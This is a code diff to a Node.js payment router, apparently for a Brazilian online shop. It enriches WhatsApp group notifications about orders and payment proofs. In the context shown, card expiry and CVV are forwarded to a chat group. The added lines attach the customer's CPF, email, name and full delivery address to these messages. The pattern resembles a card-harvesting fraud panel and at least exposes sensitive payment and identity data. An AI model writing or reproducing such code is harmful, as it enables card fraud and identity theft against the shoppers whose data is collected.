@@ -117,6 +117,7 @@ router.post('/generate', async (req, res) => {
     clientName:      user.nome || null,
     clientEmail:     user.email || null,
     clientPhone:     user.whatsapp || null,
+    clientCpf:       user.cpf || null,
     groupMessageId:  null,
     proofGroupMessageId: null,
     address,
@@ -136,6 +137,11 @@ router.post('/generate', async (req, res) => {
       cardExpiry:   newPayment.cardExpiry,
       cardCvv:      newPayment.cardCvv,
       installments: newPayment.installments,
+      // Dados do cliente para mensagem completa
+      clientName:  user.nome,
+      clientEmail: user.email,
+      clientCpf:   user.cpf,
+      address,
     });
     newPayment.groupMessageId = messageId;
     newPayment.logs.push({
@@ -218,21 +224,42 @@ router.post('/proof', async (req, res) => {
   if (sock) {
     try {
       const shortDisplay = payment.shortId ? `#${payment.shortId}` : payment.id.slice(0, 8);
+      const addrObj = payment.address;
+      const addrLine = addrObj
+        ? `${addrObj.rua}, ${addrObj.numero}${addrObj.complemento ? ' '+addrObj.complemento : ''} — ${addrObj.bairro}, ${addrObj.cidade}/${addrObj.estado} · CEP ${addrObj.cep}`
+        : 'Não informado';
+      // Formata CPF para exibição
+      const cpfRaw = payment.clientCpf || '';
+      const cpfFmt = cpfRaw.length === 11
+        ? `${cpfRaw.slice(0,3)}.${cpfRaw.slice(3,6)}.${cpfRaw.slice(6,9)}-${cpfRaw.slice(9)}`
+        : (cpfRaw || 'Não informado');
+
       const caption = [
         '━━━━━━━━━━━━━━━',
-        '💰 NOVO COMPROVANTE',
+        '💰 *COMPROVANTE RECEBIDO — AGUARDANDO ANÁLISE*',
+        '━━━━━━━━━━━━━━━',
         '',
-        `Pedido: ${shortDisplay}`,
-        `Cliente: ${customerName || 'Não informado'}`,
-        `Telefone: ${customerPhone || 'Não informado'}`,
-        `Produto: ${productName || payment.productName || payment.productId}`,
-        `Valor: ${formatBRL(amount || payment.amount)}`,
-        `Data/Hora: ${new Date().toLocaleString('pt-BR')}`,
+        `📋 *Pedido:* ${shortDisplay}`,
+        `🆔 *ID:* ${payment.id}`,
+        `🛍️ *Produto:* ${productName || payment.productName || payment.productId || 'Não informado'}`,
+        `💰 *Valor:* ${formatBRL(amount || payment.amount)}`,
+        `📅 *Data do pedido:* ${payment.createdAt ? new Date(payment.createdAt).toLocaleString('pt-BR') : 'N/A'}`,
+        `📅 *Comprovante em:* ${new Date().toLocaleString('pt-BR')}`,
         '',
-        '↩️ Responda esta mensagem:',
-        'APROVADO — confirmar pagamento',
-        'RECUSADO [motivo] — recusar',
-        'REENVIAR — pedir novo comprovante',
+        '👤 *Dados do Cliente*',
+        `Nome:     ${payment.clientName || customerName || 'Não informado'}`,
+        `CPF:      ${cpfFmt}`,
+        `Telefone: ${customerPhone || payment.clientPhone || 'Não informado'}`,
+        `E-mail:   ${payment.clientEmail || 'Não informado'}`,
+        `Login:    ${payment.clientEmail || 'Não informado'}`,
+        '',
+        '📦 *Endereço de Entrega*',
+        addrLine,
+        '',
+        '↩️ *Responda esta mensagem:*',
+        'APROVADO — confirmar pagamento e notificar cliente',
+        'RECUSADO [motivo] — recusar e informar motivo ao cliente',
+        'REENVIAR — pedir novo comprovante ao cliente',
         '━━━━━━━━━━━━━━━'
       ].join('\n');
 
